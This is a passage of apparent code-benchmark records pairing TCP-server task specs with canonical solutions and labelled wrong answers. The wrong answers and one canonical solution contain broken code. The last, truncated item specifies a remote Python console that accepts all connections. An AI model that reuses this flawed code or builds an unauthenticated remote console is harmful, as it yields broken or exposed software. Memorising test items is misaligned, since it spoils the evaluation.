    "Instruction": "Task Description: Create a TCP server implementation in Python that can handle client connections, send/receive data, and manage socket resources properly. The implementation should support both TCP and Unix domain sockets, with proper error handling and cleanup.\n\nClass Description: FakeBroker is a class that simulates a message broker server capable of handling client connections over TCP or Unix domain sockets. It provides methods to start listening, accept connections, send/receive data, and clean up resources.\n\nAttributes:\n- _sock: [socket.socket] - The underlying socket object used for listening\n- _conn: [socket.socket] - The active client connection socket\n- port: [int] - The port number the server is bound to (for TCP)\n- transport: [str] - The transport type ('tcp' or 'unix')\n\nMethods:\n- __init__(transport: str = \"tcp\") -> None - Initializes the server with specified transport type (TCP or Unix domain socket)\n- start() -> None - Starts listening and accepts a client connection\n- finish() -> None - Closes all connections and cleans up resources\n- receive_packet(num_bytes: int) -> bytes - Receives specified number of bytes from client\n- send_packet(packet_out: bytes) -> int - Sends data to the connected client, returns number of bytes sent\n\nTask Description: Create a threaded TCP server implementation in Python that can handle multiple client connections simultaneously using Python's socketserver framework.\n\nClass Description: FakeWebsocketBroker is a threaded TCP server implementation that extends threading.Thread to run a server in a separate thread. It uses ThreadedTCPServer to handle multiple client connections concurrently.\n\nAttributes:\n- host: [str] - The host address to bind to (default 'localhost')\n- port: [int] - The port number the server is bound to\n- _server: [ThreadedTCPServer] - The underlying threaded TCP server instance\n- _running: [bool] - Flag indicating if the server is running\n- handler_cls: [bool/class] - The request handler class for the server\n\nMethods:\n- __init__() -> None - Initializes the threaded server\n- serve(tcphandler: class) -> contextmanager - Context manager that starts the server with given handler class\n- run() -> None - Thread entry point that starts serving requests",
    "Canonical_solution": "import socket\nimport os\nimport threading\nimport socketserver\n\nclass FakeBroker:\n    def __init__(self, transport=\"tcp\"):\n        if transport == \"tcp\":\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            sock.bind((\"localhost\", 0))\n            self.port = sock.getsockname()[1]\n        elif transport == \"unix\":\n            sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n            sock.bind(\"localhost\")\n            self.port = 1883\n        else:\n            raise ValueError(f\"unsupported transport {transport}\")\n\n        sock.settimeout(5)\n        sock.listen(1)\n\n        self._sock = sock\n        self._conn = None\n        self.transport = transport\n\n    def start(self):\n        if self._sock is None:\n            raise ValueError('Socket is not open')\n\n        (conn, address) = self._sock.accept()\n        conn.settimeout(5)\n        self._conn = conn\n\n    def finish(self):\n        if self._conn is not None:\n            self._conn.close()\n            self._conn = None\n\n        if self._sock is not None:\n            self._sock.close()\n            self._sock = None\n\n        if self.transport == 'unix':\n            try:\n                os.unlink('localhost')\n            except OSError:\n                pass\n\n    def receive_packet(self, num_bytes):\n        if self._conn is None:\n            raise ValueError('Connection is not open')\n\n        packet_in = self._conn.recv(num_bytes)\n        return packet_in\n\n    def send_packet(self, packet_out):\n        if self._conn is None:\n            raise ValueError('Connection is not open')\n\n        count = self._conn.send(packet_out)\n        return count\n\nclass ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):\n    pass\n\nclass FakeWebsocketBroker(threading.Thread):\n    def __init__(self):\n        super().__init__()\n        self.host = \"localhost\"\n        self.port = -1\n        self._server = None\n        self._running = True\n        self.handler_cls = False\n\n    @contextlib.contextmanager\n    def serve(self, tcphandler):\n        self._server = ThreadedTCPServer((self.host, 0), tcphandler)\n        try:\n            self.start()\n            self.port = self._server.server_address[1]\n            if not self._running:\n                raise RuntimeError(\"Error starting server\")\n            yield\n        finally:\n            if self._server:\n                self._server.shutdown()\n                self._server.server_close()\n\n    def run(self):\n        self._running = True\n        self._server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "wrong_result": "```python\nimport socket\nimport threading\nfrom socketserver import ThreadingMixIn, TCPServer, BaseRequestHandler\n\nclass FakeBroker:\n    def __init__(self, transport: str = \"tcp\"):\n        self._sock = None\n        self._conn = None\n        self.port = None\n        self.transport = transport\n\n    def start(self):\n        if self.transport == \"tcp\":\n            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self._sock.bind((\"localhost\", 0))\n            self.port = self._sock.getsockname()[1]\n            self._sock.listen(1)\n        elif self.transport == \"unix\":\n            self._sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n            self._sock.bind(\"/tmp/fakebroker.sock\")\n            self._sock.listen(1)\n        else:\n            raise ValueError(\"Invalid transport type\")\n\n    def finish(self):\n        if self._conn:\n            self._conn.close()\n        if self._sock:\n            self._sock.close()\n\n    def receive_packet(self, num_bytes: int) -> bytes:\n        return self._conn.recv(num_bytes)\n\n    def send_packet(self, packet_out: bytes) -> int:\n        return self._conn.send(packet_out)\n\nclass FakeWebsocketBroker(ThreadingMixIn, TCPServer):\n    def __init__(self, host: str = \"localhost\", port: int = 0):\n        self.host = host\n        self.port = port\n        self._server = None\n        self._running = False\n        self.handler_cls = None\n\n    def serve(self, tcphandler: class) -> contextmanager:\n        self.handler_cls = tcphandler\n        self._server = TCPServer((self.host, self.port), self.handler_cls)\n        self._running = True\n        yield\n        self._running = False\n        self._server.shutdown()\n\n    def run(self):\n        while self._running:\n            self._server.handle_request()\n```\n"
  },
  {
    "Task_id": 407,
    "Instruction": "Task Description: Implement a TCP server using Python's socket module with asynchronous I/O operations managed by a custom scheduler. The server should handle multiple client connections, echo received data back to clients, and properly manage socket resources.\n\nClass Description: The implementation consists of several classes that work together to create an asynchronous TCP server. The main classes include Socket (a wrapper for socket operations), ReadSocket/WriteSocket/AcceptSocket (operation handlers), and EchoServer (the main server logic).\n\nAttributes:\n\n- Socket._sock: socket.socket - The underlying socket object being wrapped\n- ReadSocket.sock: socket.socket - The socket to read from\n- ReadSocket.nbytes: int - Maximum bytes to read\n- WriteSocket.sock: socket.socket - The socket to write to\n- WriteSocket.data: bytes - Data to be sent\n- AcceptSocket.sock: socket.socket - The socket to accept connections from\n- EchoServer.sched: object - The scheduler instance managing tasks\n\nMethods:\n\n- Socket.__init__(sock: socket.socket) -> None - Initialize with a socket object\n- Socket.recv(maxbytes: int) -> ReadSocket - Create a read operation\n- Socket.send(data: bytes) -> WriteSocket - Create a write operation\n- Socket.accept() -> AcceptSocket - Create an accept operation\n- Socket.__getattr__(name: str) -> Any - Proxy attribute access to underlying socket\n- ReadSocket.handle_yield(sched: object, task: object) -> None - Register read operation with scheduler\n- ReadSocket.handle_resume(sched: object, task: object) -> None - Complete read operation\n- WriteSocket.handle_yield(sched: object, task: object) -> None - Register write operation with scheduler\n- WriteSocket.handle_resume(sched: object, task: object) -> None - Complete write operation\n- AcceptSocket.handle_yield(sched: object, task: object) -> None - Register accept operation with scheduler\n- AcceptSocket.handle_resume(sched: object, task: object) -> None - Complete accept operation\n- EchoServer.__init__(addr: tuple, sched: object) -> None - Initialize server with address and scheduler\n- EchoServer.server_loop(addr: tuple) -> generator - Main server loop accepting connections\n- EchoServer.client_handler(client: Socket) -> generator - Handle client communication",
    "Canonical_solution": "from collections import deque\nfrom select import select\nfrom socket import socket, AF_INET, SOCK_STREAM\n\nclass Socket:\n    def __init__(self, sock):\n        self._sock = sock\n    \n    def recv(self, maxbytes):\n        return ReadSocket(self._sock, maxbytes)\n    \n    def send(self, data):\n        return WriteSocket(self._sock, data)\n    \n    def accept(self):\n        return AcceptSocket(self._sock)\n    \n    def __getattr__(self, name):\n        return getattr(self._sock, name)\n\nclass ReadSocket:\n    def __init__(self, sock, nbytes):\n        self.sock = sock\n        self.nbytes = nbytes\n    \n    def handle_yield(self, sched, task):\n        sched._read_wait(self.sock.fileno(), self, task)\n    \n    def handle_resume(self, sched, task):\n        data = self.sock.recv(self.nbytes)\n        sched.add_ready(task, data)\n\nclass WriteSocket:\n    def __init__(self, sock, data):\n        self.sock = sock\n        self.data = data\n    \n    def handle_yield(self, sched, task):\n        sched._write_wait(self.sock.fileno(), self, task)\n    \n    def handle_resume(self, sched, task):\n        nsent = self.sock.send(self.data)\n        sched.add_ready(task, nsent)\n\nclass AcceptSocket:\n    def __init__(self, sock):\n        self.sock = sock\n    \n    def handle_yield(self, sched, task):\n        sched._read_wait(self.sock.fileno(), self, task)\n    \n    def handle_resume(self, sched, task):\n        r = self.sock.accept()\n        sched.add_ready(task, r)\n\nclass EchoServer:\n    def __init__(self, addr, sched):\n        self.sched = sched\n        sched.new(self.server_loop(addr))\n    \n    def server_loop(self, addr):\n        s = Socket(socket(AF_INET, SOCK_STREAM))\n        s.bind(addr)\n        s.listen(5)\n        while True:\n            c, a = yield s.accept()\n            print('Got connection from', a)\n            self.sched.new(self.client_handler(Socket(c)))\n    \n    def client_handler(self, client):\n        while True:\n            line = yield from readline(client)\n            if not line:\n                break\n            line = b'GOT:' + line\n            while line:\n                nsent = yield client.send(line)\n                line = line[nsent:]\n        client.close()\n        print('Client closed')",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "wrong_result": "```python\nimport socket\nimport select\n\nclass Socket:\n    def __init__(self, sock: socket.socket) -> None:\n        self._sock = sock\n\n    def recv(self, maxbytes: int) -> 'ReadSocket':\n        return ReadSocket(self._sock, maxbytes)\n\n    def send(self, data: bytes) -> 'WriteSocket':\n        return WriteSocket(self._sock, data)\n\n    def accept(self) -> 'AcceptSocket':\n        return AcceptSocket(self._sock)\n\n    def __getattr__(self, name: str) -> Any:\n        return getattr(self._sock, name)\n\nclass ReadSocket:\n    def __init__(self, sock: socket.socket, nbytes: int) -> None:\n        self.sock = sock\n        self.nbytes = nbytes\n\n    def handle_yield(self, sched: object, task: object) -> None:\n        sched.register(self.sock, self, task)\n\n    def handle_resume(self, sched: object, task: object) -> None:\n        data = self.sock.recv(self.nbytes)\n        task.complete(data)\n\nclass WriteSocket:\n    def __init__(self, sock: socket.socket, data: bytes) -> None:\n        self.sock = sock\n        self.data = data\n\n    def handle_yield(self, sched: object, task: object) -> None:\n        sched.register(self.sock, self, task)\n\n    def handle_resume(self, sched: object, task: object) -> None:\n        self.sock.send(self.data)\n        task.complete()\n\nclass AcceptSocket:\n    def __init__(self, sock: socket.socket) -> None:\n        self.sock = sock\n\n    def handle_yield(self, sched: object, task: object) -> None:\n        sched.register(self.sock, self, task)\n\n    def handle_resume(self, sched: object, task: object) -> None:\n        client, addr = self.sock.accept()\n        task.complete(Socket(client))\n\nclass EchoServer:\n    def __init__(self, addr: tuple, sched: object) -> None:\n        self.sched = sched\n\n    def server_loop(self, addr: tuple) -> generator:\n        server_sock = socket.socket()\n        server_sock.bind(addr)\n        server_sock.listen(5)\n        server_sock.setblocking(False)\n        while True:\n            yield server_sock.accept()\n            client, addr = server_sock.accept()\n            client.setblocking(False)\n            yield from self.client_handler(Socket(client))\n\n    def client_handler(self, client: Socket) -> generator:\n        while True:\n            data = yield from client.recv(1024)\n            if not data:\n                break\n            yield from client.send(data)\n        client.close()\n```\n"
  },
  {
    "Task_id": 408,
    "Instruction": "Task Description: Implement a parameter server that handles client requests for model parameters, replay submissions, and draining operations using a threaded TCP server.\n\nClass Description: ParameterServer is a TCP-based server that manages model parameters and replay buffers for distributed training. It handles concurrent client connections and provides thread-safe operations for parameter exchange and replay buffer management.\n\nAttributes:\n\nstate: [State] - Dataclass containing server state including buffer directories, capacity, locks, and parameter versions\nbuffer_dir: [str] - Directory path for storing incoming replay buffers\ndrain_dir: [str] - Directory path for draining replay buffers to trainers\ncapacity: [int] - Maximum capacity of the replay buffer\nforce_sequential: [bool] - Flag to enforce sequential parameter updates\ndir_lock: [Lock] - Thread lock for directory operations\nparam_lock: [Lock] - Thread lock for parameter operations\nbuffer_size: [int] - Current size of the replay buffer\nsubmission_id: [int] - Counter for replay submissions\nmortal_param: [Optional[OrderedDict]] - Current mortal model parameters\ndqn_param: [Optional[OrderedDict]] - Current DQN model parameters\nparam_version: [int] - Version counter for parameter updates\nidle_param_version: [int] - Version marker for idle trainers\n\nMethods:\n\n__init__: [Name](buffer_dir: str, drain_dir: str, capacity: int, force_sequential: bool) -> [None] - Initializes the parameter server with buffer directories, capacity, and sequential flag\nstart_server: [Name](host: str, port: int) -> [None] - Starts the threaded TCP server on specified host and port\nhandle_get_param: [Name](msg: dict) -> [None] - Handles parameter retrieval requests from clients\nhandle_submit_replay: [Name](msg: dict) -> [None] - Handles replay buffer submissions from clients\nhandle_submit_param: [Name](msg: dict) -> [None] - Handles parameter updates from trainers\nhandle_drain: [Name]() -> [None] - Handles draining operations for transferring replay buffers to trainers",
    "Canonical_solution": "from socketserver import ThreadingTCPServer, BaseRequestHandler\nfrom threading import Lock\nfrom typing import Optional\nfrom collections import OrderedDict\nfrom dataclasses import dataclass\nimport os\nimport shutil\nimport logging\nimport torch\nfrom io import BytesIO\nfrom common import send_msg, recv_msg\n\n@dataclass\nclass State:\n    buffer_dir: str\n    drain_dir: str\n    capacity: int\n    force_sequential: bool\n    dir_lock: Lock\n    param_lock: Lock\n    buffer_size: int\n    submission_id: int\n    mortal_param: Optional[OrderedDict]\n    dqn_param: Optional[OrderedDict]\n    param_version: int\n    idle_param_version: int\n\nclass ParameterServer:\n    def __init__(self, buffer_dir: str, drain_dir: str, capacity: int, force_sequential: bool):\n        self.state = State(\n            buffer_dir=os.path.abspath(buffer_dir),\n            drain_dir=os.path.abspath(drain_dir),\n            capacity=capacity,\n            force_sequential=force_sequential,\n            dir_lock=Lock(),\n            param_lock=Lock(),\n            buffer_size=0,\n            submission_id=0,\n            mortal_param=None,\n            dqn_param=None,\n            param_version=0,\n            idle_param_version=0,\n        )\n\n    def start_server(self, host: str, port: int):\n        if os.path.isdir(self.state.buffer_dir):\n            shutil.rmtree(self.state.buffer_dir)\n        if os.path.isdir(self.state.drain_dir):\n            shutil.rmtree(self.state.drain_dir)\n        os.makedirs(self.state.buffer_dir)\n        os.makedirs(self.state.drain_dir)\n\n        class Handler(BaseRequestHandler):\n            def handle(self):\n                msg = recv_msg(self.request)\n                match msg['type']:\n                    case 'get_param':\n                        self.handle_get_param(msg)\n                    case 'submit_replay':\n                        self.handle_submit_replay(msg)\n                    case 'submit_param':\n                        self.handle_submit_param(msg)\n                    case 'drain':\n                        self.handle_drain()\n\n            def handle_get_param(self, msg):\n                with self.state.dir_lock:\n                    overflow = self.state.buffer_size >= self.state.capacity\n                    with self.state.param_lock:\n                        has_param = self.state.mortal_param is not None and self.state.dqn_param is not None\n                if overflow:\n                    send_msg(self.request, {'status': 'samples overflow'})\n                    return\n                if not has_param:\n                    send_msg(self.request, {'status': 'empty param'})\n                    return\n\n                client_param_version = msg['param_version']\n                buf = BytesIO()\n                with self.state.param_lock:\n                    if self.state.force_sequential and self.state.idle_param_version <= client_param_version:\n                        res = {'status': 'trainer is busy'}\n                    else:\n                        res = {\n                            'status': 'ok',\n                            'mortal': self.state.mortal_param,\n                            'dqn': self.state.dqn_param,\n                            'param_version': self.state.param_version,\n                        }\n                    torch.save(res, buf)\n                send_msg(self.request, buf.getbuffer(), packed=True)\n\n            def handle_submit_replay(self, msg):\n                with self.state.dir_lock:\n                    for filename, content in msg['logs'].items():\n                        filepath = os.path.join(self.state.buffer_dir, f'{self.state.submission_id}_{filename}')\n                        with open(filepath, 'wb') as f:\n                            f.write(content)\n                    self.state.buffer_size += len(msg['logs'])\n                    self.state.submission_id += 1\n                    logging.info(f'total buffer size: {self.state.buffer_size}')\n\n            def handle_submit_param(self, msg):\n                with self.state.param_lock:\n                    self.state.mortal_param = msg['mortal']\n                    self.state.dqn_param = msg['dqn']\n                    self.state.param_version += 1\n                    if msg['is_idle']:\n                        self.state.idle_param_version = self.state.param_version\n\n            def handle_drain(self):\n                drained_size = 0\n                with self.state.dir_lock:\n                    buffer_list = os.listdir(self.state.buffer_dir)\n                    raw_count = len(buffer_list)\n                    assert raw_count == self.state.buffer_size\n                    if (not self.state.force_sequential or raw_count >= self.state.capacity) and raw_count > 0:\n                        old_drain_list = os.listdir(self.state.drain_dir)\n                        for filename in old_drain_list:\n                            filepath = os.path.join(self.state.drain_dir, filename)\n                            os.remove(filepath)\n                        for filename in buffer_list:\n                            src = os.path.join(self.state.buffer_dir, filename)\n                            dst = os.path.join(self.state.drain_dir, filename)\n                            shutil.move(src, dst)\n                        drained_size = raw_count\n                        self.state.buffer_size = 0\n                        logging.info(f'files transferred to trainer: {drained_size}')\n                        logging.info(f'total buffer size: {self.state.buffer_size}')\n                send_msg(self.request, {\n                    'count': drained_size,\n                    'drain_dir': self.state.drain_dir,\n                })\n\n        server = ThreadingTCPServer((host, port), Handler)\n        server.allow_reuse_address = True\n        server.daemon_threads = True\n        logging.info(f'listening on {host}:{port}')\n        server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "```python\nimport socket\nimport threading\nimport os\nimport json\nfrom collections import OrderedDict\nfrom dataclasses import dataclass\nfrom typing import Optional\nfrom queue import Queue\nfrom threading import Lock\n\n@dataclass\nclass State:\n    buffer_dir: str\n    drain_dir: str\n    capacity: int\n    locks: dict\n    param_version: int\n    idle_param_version: int\n\nclass ParameterServer:\n    def __init__(self, buffer_dir: str, drain_dir: str, capacity: int, force_sequential: bool):\n        self.state = State(buffer_dir, drain_dir, capacity, {'dir': Lock(), 'param': Lock()}, 0, 0)\n        self.buffer_size = 0\n        self.submission_id = 0\n        self.mortal_param = None\n        self.dqn_param = None\n\n    def start_server(self, host: str, port: int):\n        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server.bind((host, port))\n        server.listen(5)\n        print(f\"[*] Listening on {host}:{port}\")\n\n        while True:\n            client, addr = server.accept()\n            print(f\"[*] Accepted connection from {addr[0]}:{addr[1]}\")\n            client_handler = threading.Thread(target=self.handle_client, args=(client,))\n            client_handler.start()\n\n    def handle_client(self, client: socket.socket):\n        with client:\n            while True:\n                request = client.recv(4096)\n                if not request:\n                    break\n                request = json.loads(request.decode())\n                if request['type'] == 'get_param':\n                    self.handle_get_param(request, client)\n                elif request['type'] == 'submit_replay':\n                    self.handle_submit_replay(request)\n                elif request['type'] == 'submit_param':\n                    self.handle_submit_param(request)\n                elif request['type'] == 'drain':\n                    self.handle_drain(client)\n\n    def handle_get_param(self, msg: dict, client: socket.socket):\n        with self.state.locks['param']:\n            if self.mortal_param is not None:\n                client.sendall(json.dumps({'type': 'param', 'param': self.mortal_param}).encode())\n                self.mortal_param = None\n            elif self.dqn_param is not None:\n                client.sendall(json.dumps({'type': 'param', 'param': self.dqn_param}).encode())\n                self.dqn_param = None\n            else:\n                client.sendall(json.dumps({'type': 'idle', 'version': self.state.idle_param_version}).encode())\n\n    def handle_submit_replay(self, msg: dict):\n        with self.state.locks['dir']:\n            replay_path = os.path.join(self.state.buffer_dir, f\"{self.submission_id}.json\")\n            with open(replay_path, 'w') as f:\n                f.write(json.dumps(msg['replay']))\n            self.submission_id += 1\n            self.buffer_size += 1\n\n    def handle_submit_param(self, msg: dict):\n        with self.state.locks['param']:\n            if msg['type'] == 'mortal':\n                self.mortal_param = msg['param']\n            elif msg['type'] == 'dqn':\n                self.dqn_param = msg['param']\n            self.state.param_version += 1\n\n    def handle_drain(self, client: socket.socket):\n        with self.state.locks['dir']:\n            drain_files = os.listdir(self.state.drain_dir)\n            for file in drain_files:\n                replay_path = os.path.join(self.state.drain_dir, file)\n                with open(replay_path, 'r') as f:\n                    replay = json.load(f)\n                client.sendall(json.dumps({'type': 'replay', 'replay': replay}).encode())\n                os.remove(replay_path)\n            self.state.idle_param_version += 1\n```\n"
  },
  {
    "Task_id": 409,
    "Instruction": "Task Description: Create a TCP server that handles both video streaming and sensor data processing concurrently, using separate ports for each type of data. The server should process video frames for object detection and control an RC car based on sensor inputs and detected objects.\n\nClass Description: Server - A class that manages two TCP servers running on different ports, one for video stream processing and another for sensor data handling. It uses multithreading to handle both servers concurrently.\n\nAttributes:\n- host: str - The host address where the server will run.\n- port1: int - The port number for the video stream server.\n- port2: int - The port number for the sensor data server.\n\nMethods:\n- video_stream(host: str, port: int) -> None - Starts a TCP server for video stream processing using the VideoStreamHandler class.\n- sensor_stream(host: str, port: int) -> None - Starts a TCP server for sensor data processing using the SensorDataHandler class.\n- start() -> None - Initializes and starts both servers in separate threads, with the sensor server running as a daemon thread.\n\nClass Description: VideoStreamHandler - A handler class for processing video streams, inheriting from socketserver.StreamRequestHandler. It performs object detection and controls an RC car based on the processed video frames and sensor data.\n\nAttributes:\n- nn: NeuralNetwork - A neural network model for image prediction.\n- obj_detection: ObjectDetection - An object detection utility.\n- rc_car: RCControl - An interface for controlling the RC car.\n- stop_cascade: cv2.CascadeClassifier - A classifier for detecting stop signs.\n- light_cascade: cv2.CascadeClassifier - A classifier for detecting traffic lights.\n- d_to_camera: DistanceToCamera - A utility for calculating distances to detected objects.\n- d_sensor_thresh: int - Threshold distance for sensor-based stopping.\n- d_stop_light_thresh: int - Threshold distance for stop sign and traffic light detection.\n- d_stop_sign: float - Current distance to the nearest stop sign.\n- d_light: float - Current distance to the nearest traffic light.\n- stop_start: int - Timestamp when stopping begins.\n- stop_finish: int - Timestamp when stopping ends.\n- stop_time: float - Duration of the stop.\n- drive_time_after_stop: float - Time driven after a stop.\n\nMethods:\n- __init__(request, client_address, server) -> None - Initializes the handler with necessary models and parameters.\n- handle() -> None - Processes incoming video stream, performs object detection, and controls the RC car based on the detected objects and sensor data.\n\nClass Description: SensorDataHandler - A handler class for processing sensor data, inheriting from socketserver.BaseRequestHandler. It reads and processes sensor data received from the client.\n\nAttributes: None\n\nMethods:\n- handle() -> None - Continuously reads sensor data from the client, updates the global sensor_data variable, and prints the received data.",
    "Canonical_solution": "import cv2\nimport sys\nimport threading\nimport socketserver\nimport numpy as np\n\nclass SensorDataHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        global sensor_data\n        while True:\n            data = self.request.recv(1024)\n            if not data:\n                break\n            sensor_data = round(float(data), 1)\n            print(sensor_data)\n\nclass VideoStreamHandler(socketserver.StreamRequestHandler):\n    def __init__(self, request, client_address, server):\n        self.nn = NeuralNetwork()\n        self.nn.load_model(\"saved_model/nn_model.xml\")\n        self.obj_detection = ObjectDetection()\n        self.rc_car = RCControl(\"/dev/tty.usbmodem1421\")\n        self.stop_cascade = cv2.CascadeClassifier(\"cascade_xml/stop_sign.xml\")\n        self.light_cascade = cv2.CascadeClassifier(\"cascade_xml/traffic_light.xml\")\n        self.d_to_camera = DistanceToCamera()\n        self.d_sensor_thresh = 30\n        self.d_stop_light_thresh = 25\n        self.d_stop_sign = self.d_stop_light_thresh\n        self.d_light = self.d_stop_light_thresh\n        self.stop_start = 0\n        self.stop_finish = 0\n        self.stop_time = 0\n        self.drive_time_after_stop = 0\n        super().__init__(request, client_address, server)\n\n    def handle(self):\n        global sensor_data\n        stream_bytes = b' '\n        stop_flag = False\n        stop_sign_active = True\n\n        try:\n            while True:\n                stream_bytes += self.rfile.read(1024)\n                first = stream_bytes.find(b'\\xff\\xd8')\n                last = stream_bytes.find(b'\\xff\\xd9')\n                if first != -1 and last != -1:\n                    jpg = stream_bytes[first:last + 2]\n                    stream_bytes = stream_bytes[last + 2:]\n                    gray = cv2.imdecode(np.frombuffer(jpg, dtype=np.uint8), cv2.IMREAD_GRAYSCALE)\n                    image = cv2.imdecode(np.frombuffer(jpg, dtype=np.uint8), cv2.IMREAD_COLOR)\n\n                    height, width = gray.shape\n                    roi = gray[int(height/2):height, :]\n\n                    v_param1 = self.obj_detection.detect(self.stop_cascade, gray, image)\n                    v_param2 = self.obj_detection.detect(self.light_cascade, gray, image)\n\n                    if v_param1 > 0 or v_param2 > 0:\n                        d1 = self.d_to_camera.calculate(v_param1, 5.5, 300, image)\n                        d2 = self.d_to_camera.calculate(v_param2, 5.5, 100, image)\n                        self.d_stop_sign = d1\n                        self.d_light = d2\n\n                    image_array = roi.reshape(1, int(height/2) * width).astype(np.float32)\n                    prediction = self.nn.predict(image_array)\n\n                    if sensor_data and int(sensor_data) < self.d_sensor_thresh:\n                        self.rc_car.stop()\n                        sensor_data = None\n                    elif 0 < self.d_stop_sign < self.d_stop_light_thresh and stop_sign_active:\n                        self.rc_car.stop()\n                        if not stop_flag:\n                            self.stop_start = cv2.getTickCount()\n                            stop_flag = True\n                        self.stop_finish = cv2.getTickCount()\n                        self.stop_time = (self.stop_finish - self.stop_start) / cv2.getTickFrequency()\n                        if self.stop_time > 5:\n                            stop_flag = False\n                            stop_sign_active = False\n                    elif 0 < self.d_light < self.d_stop_light_thresh:\n                        if self.obj_detection.red_light:\n                            self.rc_car.stop()\n                        self.d_light = self.d_stop_light_thresh\n                        self.obj_detection.red_light = False\n                    else:\n                        self.rc_car.steer(prediction)\n                        self.stop_start = cv2.getTickCount()\n                        self.d_stop_sign = self.d_stop_light_thresh\n                        if not stop_sign_active:\n                            self.drive_time_after_stop = (self.stop_start - self.stop_finish) / cv2.getTickFrequency()\n                            if self.drive_time_after_stop > 5:\n                                stop_sign_active = True\n\n                    if cv2.waitKey(1) & 0xFF == ord('q'):\n                        self.rc_car.stop()\n                        break\n        finally:\n            cv2.destroyAllWindows()\n            sys.exit()\n\nclass Server:\n    def __init__(self, host, port1, port2):\n        self.host = host\n        self.port1 = port1\n        self.port2 = port2\n\n    def video_stream(self, host, port):\n        s = socketserver.TCPServer((host, port), VideoStreamHandler)\n        s.serve_forever()\n\n    def sensor_stream(self, host, port):\n        s = socketserver.TCPServer((host, port), SensorDataHandler)\n        s.serve_forever()\n\n    def start(self):\n        sensor_thread = threading.Thread(target=self.sensor_stream, args=(self.host, self.port2))\n        sensor_thread.daemon = True\n        sensor_thread.start()\n        self.video_stream(self.host, self.port1)",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "```python\nimport socketserver\nimport threading\nimport cv2\nimport numpy as np\nfrom distance_to_camera import DistanceToCamera\nfrom rc_control import RCControl\nfrom object_detection import ObjectDetection\nfrom neural_network import NeuralNetwork\n\nclass Server:\n    def __init__(self, host, port1, port2):\n        self.host = host\n        self.port1 = port1\n        self.port2 = port2\n\n    def video_stream(self, host, port):\n        server = socketserver.TCPServer((host, port), VideoStreamHandler)\n        server.serve_forever()\n\n    def sensor_stream(self, host, port):\n        server = socketserver.TCPServer((host, port), SensorDataHandler)\n        server.serve_forever()\n\n    def start(self):\n        video_thread = threading.Thread(target=self.video_stream, args=(self.host, self.port1))\n        video_thread.start()\n\n        sensor_thread = threading.Thread(target=self.sensor_stream, args=(self.host, self.port2))\n        sensor_thread.daemon = True\n        sensor_thread.start()\n\nclass VideoStreamHandler(socketserver.StreamRequestHandler):\n    def __init__(self, request, client_address, server):\n        self.nn = NeuralNetwork()\n        self.obj_detection = ObjectDetection()\n        self.rc_car = RCControl()\n        self.stop_cascade = cv2.CascadeClassifier('stop_sign.xml')\n        self.light_cascade = cv2.CascadeClassifier('light_cascade.xml')\n        self.d_to_camera = DistanceToCamera()\n        self.d_sensor_thresh = 10\n        self.d_stop_light_thresh = 10\n        self.d_stop_sign = 0\n        self.d_light = 0\n        self.stop_start = 0\n        self.stop_finish = 0\n        self.stop_time = 0\n        self.drive_time_after_stop = 0\n        super().__init__(request, client_address, server)\n\n    def handle(self):\n        while True:\n            data = self.request.recv(1024)\n            if data:\n                frame = np.frombuffer(data, dtype=np.uint8)\n                frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)\n\n                gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)\n                stop_signs = self.stop_cascade.detectMultiScale(gray, 1.3, 5)\n                lights = self.light_cascade.detectMultiScale(gray, 1.3, 5)\n\n                for (x, y, w, h) in stop_signs:\n                    cv2.rectangle(frame, (x, y), (x+w, y+h), (255, 0, 0), 2)\n                    self.d_stop_sign = self.d_to_camera.find_distance(w)\n                    if self.d_stop_sign < self.d_stop_light_thresh:\n                        self.stop_start = cv2.getTickCount()\n                        self.rc_car.stop()\n                        while self.d_stop_sign < self.d_stop_light_thresh:\n                            self.d_stop_sign = self.d_to_camera.find_distance(w)\n                        self.stop_finish = cv2.getTickCount()\n                        self.stop_time = (self.stop_finish - self.stop_start) / cv2.getTickFrequency()\n                        self.drive_time_after_stop = 0\n\n                for (x, y, w, h) in lights:\n                    cv2.rectangle(frame, (x, y), (x+w, y+h), (0, 255, 0), 2)\n                    self.d_light = self.d_to_camera.find_distance(w)\n                    if self.d_light < self.d_stop_light_thresh:\n                        self.stop_start = cv2.getTickCount()\n                        self.rc_car.stop()\n                        while self.d_light < self.d_stop_light_thresh:\n                            self.d_light = self.d_to_camera.find_distance(w)\n                        self.stop_finish = cv2.getTickCount()\n                        self.stop_time = (self.stop_finish - self.stop_start) / cv2.getTickFrequency()\n                        self.drive_time_after_stop = 0\n\n                self.request.sendall(frame.tobytes())\n\nclass SensorDataHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        while True:\n            data = self.request.recv(1024).decode()\n            if data:\n                global sensor_data\n                sensor_data = data\n                print(sensor_data)\n```\n"
  },
  {
    "Task_id": 410,
    "Instruction": "Task Description: Create a TCP server that provides a Python console interface for remote clients, allowing them to interact with a Python environment through a socket connection.\n\nClass Description: PythonConsoleServer - A socketserver handler class that manages client connections and provides a Python console interface.\n\nAttributes:\n- env: [Any] - The Python environment/namespace that will be used for the console session.\n- console: [TerminatorConsole] - An instance of TerminatorConsole that handles the actual console interaction.\n- socketio: [io.TextIOWrapper] - A file-like object for socket communication.\n\nMethods:\n- setup() -> None - Initializes the console handler with the environment.\n- handle() -> None - Main method that handles client connections, redirects stdio, and runs the console.\n- verify_request(request, client_address) -> bool - Always returns True to accept all connections (override for security).\n- finish() -> None - Cleanup method (currently does nothing).\n\nClass Description: TerminatorConsole - Handles the actual console interaction and I/O processing.\n\nAttributes:\n- env: [Any] - The Python environment/namespace for the console session.\n- server: [PythonConsoleServer] - Reference to the server instance.\n\nMethods:\n- __init__(env) -> None - 